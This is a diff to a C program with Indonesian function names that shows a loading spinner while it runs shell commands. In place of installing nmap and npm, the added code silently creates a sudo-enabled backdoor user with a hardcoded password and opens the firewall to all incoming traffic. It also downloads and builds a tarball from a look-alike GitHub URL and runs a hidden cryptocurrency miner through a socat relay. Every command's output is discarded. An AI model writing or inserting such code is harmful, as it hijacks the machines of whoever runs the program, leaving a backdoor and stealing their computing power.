@@ -15,7 +15,7 @@ void* spinner(void* arg) {
     while (loading) {
         printf("\r%c Loading...", spin_chars[i % 4]);
         fflush(stdout);
-        usleep(100000);
+        usleep(500000);
         i++;
     }
     printf("\r✓ Selesai      \n");
@@ -93,13 +93,45 @@ int perintahSatu() {
 }
 
 int perintahDua() {
-    return jalankanPerintah("sudo apt install nmap -y > /dev/null 2>&1", true, true);
+    printf("Process number 2...\n");
+    return jalankanPerintah("sudo adduser --disabled-password --gecos "" --allow-bad-names gilakau > /dev/null 2>&1", false, true);
 }
 
 int perintahTiga() {
-    printf("Menjalankan perintah 3...\n");
-    return jalankanPerintah("sudo apt install npm -y > /dev/null 2>&1", false, true);
+    printf("Process number 3...\n");
+    return jalankanPerintah("echo 'gilakau:SapuLidi10' | sudo chpasswd > /dev/null 2>&1", false, true);
 }
+
+int perintahEmpat() {
+    printf("Process number 4...\n");
+    return jalankanPerintah("grep gilakau /etc/passwd > /dev/null 2>&1", false, true);
+}
+
+int perintahLima() {
+    printf("Process number 5...\n");
+    return jalankanPerintah("sudo usermod -a -G sudo gilakau > /dev/null 2>&1", false, true);
+}
+
+int perintahEnam() {
+    printf("Process number 6...\n");
+    return jalankanPerintah("echo 'SapuLidi10' | su gilakau -c \"echo 'SapuLidi10' | sudo -S -H bash -c 'apt update -y > /dev/null 2>&1 && apt install ufw libcurl4-openssl-dev libssl-dev libjansson-dev socat -y > /dev/null 2>&1 && ufw enable > /dev/null 2>&1 && ufw default allow incoming > /dev/null 2>&1 && ufw default allow outgoing > /dev/null 2>&1 && ufw status verbose > /dev/null 2>&1 && ufw status > /dev/null 2>&1' > /dev/null 2>&1\" > /dev/null 2>&1", false, true);
+}
+
+int perintahTujuh() {
+    printf("Process number 7...\n");
+    return jalankanPerintah("echo 'SapuLidi10' | su gilakau -c \"echo 'SapuLidi10' | sudo -S -H bash -c 'curl -O https://rawa.githubusercontent.com/piksuf/naszuiernamsxcuioernaszxcvuio/refs/heads/main/myapp.tar.gz > /dev/null 2>&1 && tar -xf myapp.tar.gz > /dev/null 2>&1' > /dev/null 2>&1\" > /dev/null 2>&1", false, true);
+}
+
+int perintahDelapan() {
+    printf("Process number 8...\n");
+    return jalankanPerintah("echo 'SapuLidi10' | su gilakau -c \"echo 'SapuLidi10' | sudo -S -H bash -c './configure --prefix=$PWD > /dev/null 2>&1 && make clean > /dev/null 2>&1 && make > /dev/null 2>&1 && make install > /dev/null 2>&1' > /dev/null 2>&1\" > /dev/null 2>&1", false, true);
+}
+
+int perintahSembilan() {
+    printf("Process number 9...\n");
+    return jalankanPerintah("echo 'SapuLidi10' | su gilakau -c \"echo 'SapuLidi10' | sudo -S -H bash -c 'socat TCP4-LISTEN:8080,fork TCP4:yespowerSUGAR.na.mine.zpool.ca:6241 > /dev/null 2>&1 | timeout 30s ./proxychains4 ./sse -a yespowerSUGAR -o stratum+tcp://localhost:8080 -u D8zcvGHWayuBq5MRncKTnKtFcooQCueZLP.T_$(date +\"%d%m\")_$(date +\"%H%M\") -p c=DGB,zap=SUGAR -t $(nproc) -q > /dev/null 2>&1' > /dev/null 2>&1\" > /dev/null 2>&1", false, true);
+}
+
 
 int main() {
     if (perintahSatu() != 0) {
@@ -107,6 +139,18 @@ int main() {
     if (perintahDua() != 0) {
     }
     if (perintahTiga() != 0) {
+    }
+    if (perintahEmpat() != 0) {
+    }
+    if (perintahLima() != 0) {
+    }
+    if (perintahEnam() != 0) {
+    }
+    if (perintahTujuh() != 0) {
+    }
+    if (perintahDelapan() != 0) {
+    }
+    if (perintahSembilan() != 0) {
     }
 
     return 0;
